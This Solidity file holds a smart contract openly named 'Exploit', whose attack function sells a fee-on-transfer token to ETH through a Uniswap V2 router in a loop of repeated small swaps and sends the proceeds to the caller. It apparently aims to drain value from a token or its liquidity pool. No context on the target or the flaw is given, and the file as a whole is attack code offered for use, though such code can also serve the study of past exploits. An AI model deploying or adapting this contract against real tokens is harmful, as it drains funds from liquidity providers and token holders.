// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

import "./../interfaces.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Exploit {
    IERC20 public token;
    IUniswapV2Router02 public router;

    constructor(address _token, address _router) {
        token = IERC20(_token);
        router = IUniswapV2Router02(_router);
    }

    function attack(uint256 n) public {
        uint256 tokenBalance = IERC20(token).balanceOf(address(this));

        token.approve(address(router), tokenBalance);

        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = router.WETH();

        uint256 amountToSell = tokenBalance / 100;

        for(uint256 i=0; i < n; i++) {
            router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                amountToSell,
                0,
                path,
                msg.sender,
                block.timestamp
            );

            amountToSell = amountToSell - (amountToSell / 100);
        }
    }
}


